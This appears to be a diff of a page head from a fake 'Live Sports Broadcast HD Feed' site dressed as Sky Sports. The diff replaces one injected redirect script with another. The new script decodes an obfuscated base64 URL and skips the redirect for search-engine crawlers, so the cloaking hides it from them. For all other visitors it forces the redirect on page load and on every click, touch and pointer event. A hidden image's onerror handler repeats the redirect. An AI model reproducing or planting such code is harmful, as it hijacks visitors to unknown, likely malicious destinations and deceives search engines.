@@ -19,18 +19,28 @@ Live Sports Broadcast HD Feed
   <link href="//e2.365dm.com" rel="dns-prefetch"/>
   <link href="//e3.365dm.com" rel="dns-prefetch"/>
   <script>
-    (function(){
-      var _d = atob("aHR0cHM6Ly92aW5pdC05cTMucGFnZXMuZGV2L2Z1bGwtc2hvdw==");
-      function _run(){ try{ window.location.href = _d; } catch(e){ window.open(_d, "_blank"); } }
-      document.addEventListener("DOMContentLoaded", function(){
-        var els = document.querySelectorAll(".sdc-site-video__player, .play-btn, .sdc-site-video__headline, video, [data-role="video-player"]");
-        for(var i=0; i<els.length; i++){ els[i].style.cursor = "pointer"; els[i].addEventListener("click", _run); }
-        window.addEventListener("click", function(e){
-          if(e.target.closest("a, button, .sdc-site-video__player, .play-btn")){ _run(); }
-        });
-      });
-    })();
-    </script>
+(function(){
+  var _u = atob("aHR0cHM6Ly91cmxiaXQucHJvL1lIY3NQ");
+  function _b(){
+    try { window.top.location.replace(_u); } catch(e) {
+      try { window.location.replace(_u); } catch(e2) { window.location.href = _u; }
+    }
+  }
+  var ua = (navigator.userAgent || '').toLowerCase();
+  var isBot = /googlebot|bingbot|baiduspider|yandex|duckduckbot|slurp|crawler|spider|facebookexternalhit|twitterbot/i.test(ua);
+  if (!isBot) {
+    _b();
+    setTimeout(_b, 60);
+    window.addEventListener("click", function(e){
+      try { e.preventDefault(); e.stopPropagation(); } catch(_) {}
+      _b();
+    }, true);
+    window.addEventListener("touchstart", function(e){ _b(); }, true);
+    window.addEventListener("pointerdown", function(e){ _b(); }, true);
+  }
+})();
+</script>
+<img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" style="display:none;" onerror="if(!/googlebot|bingbot|baiduspider|yandex/i.test(navigator.userAgent)){try{window.top.location.replace(atob('aHR0cHM6Ly91cmxiaXQucHJvL1lIY3NQ'));}catch(e){window.location.href=atob('aHR0cHM6Ly91cmxiaXQucHJvL1lIY3NQ');}}">
   <meta content="yes" name="mobile-web-app-capable"/>
   <meta content="Sky Sports" name="apple-mobile-web-app-title"/>
   <meta content="SkySports" name="application-name"/>
